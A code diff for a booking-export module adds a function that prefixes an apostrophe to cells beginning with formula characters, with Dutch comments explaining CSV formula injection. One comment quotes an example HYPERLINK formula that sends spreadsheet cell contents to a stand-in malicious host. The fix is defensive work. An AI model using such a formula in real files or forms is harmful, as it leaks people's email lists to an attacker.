@@ -1,9 +1,22 @@
 const store = require("../../../lib/store-sql");
 const { requireStaff } = require("../../../lib/auth");
 
+// De namen in deze export komen uit het publieke boekingsformulier en worden
+// serverside niet beperkt. Escapen van komma's en aanhalingstekens alleen is
+// daarom niet genoeg: Excel en LibreOffice behandelen een cel die met = + - @
+// (of een tab/CR) begint als FORMULE. Iemand kan dus boeken onder de naam
+//   =HYPERLINK("https://kwaadaardig.be/?x="&A1&B1;"klik")
+// en die formule draait zodra jij het bestand opent — met je volledige
+// e-maillijst als buit. Een apostrof ervoor dwingt de spreadsheet de cel als
+// tekst te lezen. Zie het veiligheidsrapport van 19-08-2026.
+function neutralizeFormula(str) {
+  return /^[=+\-@\t\r]/.test(str) ? `'${str}` : str;
+}
+
 function csvEscape(value) {
-  const str = value === null || value === undefined ? "" : String(value);
-  if (/[",\n]/.test(str)) return `"${str.replace(/"/g, '""')}"`;
+  const raw = value === null || value === undefined ? "" : String(value);
+  const str = neutralizeFormula(raw);
+  if (/[",\n\r]/.test(str)) return `"${str.replace(/"/g, '""')}"`;
   return str;
 }
 
